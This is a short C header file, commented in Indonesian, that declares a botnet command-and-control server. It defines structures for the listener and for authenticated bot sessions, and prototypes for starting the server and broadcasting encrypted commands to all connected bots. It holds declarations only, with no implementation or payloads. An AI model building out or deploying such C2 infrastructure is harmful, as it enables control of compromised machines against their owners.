/**
 * @file c2_server.h
 * @brief Definisi listener instruksi untuk Master/Relay Node dalam menerima koneksi bot.
 */

#ifndef C2_SERVER_H
#define C2_SERVER_H

#include <stdint.h>
#include <stdbool.h>
#include <netinet/in.h>

#define MAX_CONNECTIONS 1024
#define LISTEN_QUEUE_BACKLOG 128

typedef struct {
    int server_fd;
    uint16_t port;
    bool is_running;
    int epoll_fd;
} c2_server_t;

typedef struct {
    int client_fd;
    struct sockaddr_in address;
    uint32_t bot_id;
    bool authenticated;
} c2_client_session_t;

/**
 * @brief Menginisialisasi C2 Server listener.
 * @param server Pointer ke struktur c2_server_t.
 * @param port Port yang akan didengar.
 * @return int 0 jika sukses, -1 jika gagal.
 */
int c2_server_init(c2_server_t *server, uint16_t port);

/**
 * @brief Menjalankan server loop (non-blocking / epoll based).
 * @param server Pointer ke c2_server_t.
 * @return int 0 jika berjalan normal, -1 jika error fatal.
 */
int c2_server_start(c2_server_t *server);

/**
 * @brief Menghentikan C2 Server dan menutup semua socket klien aktif.
 * @param server Pointer ke c2_server_t.
 */
void c2_server_stop(c2_server_t *server);

/**
 * @brief Mengirim perintah siaran (broadcast) ke semua bot terhubung.
 * @param server Pointer ke c2_server_t.
 * @param payload Buffer data perintah terenkripsi.
 * @param payload_len Panjang payload.
 * @return int Jumlah bot yang berhasil dikirimi pesan.
 */
int c2_server_broadcast(c2_server_t *server, const uint8_t *payload, size_t payload_len);

#endif // C2_SERVER_H

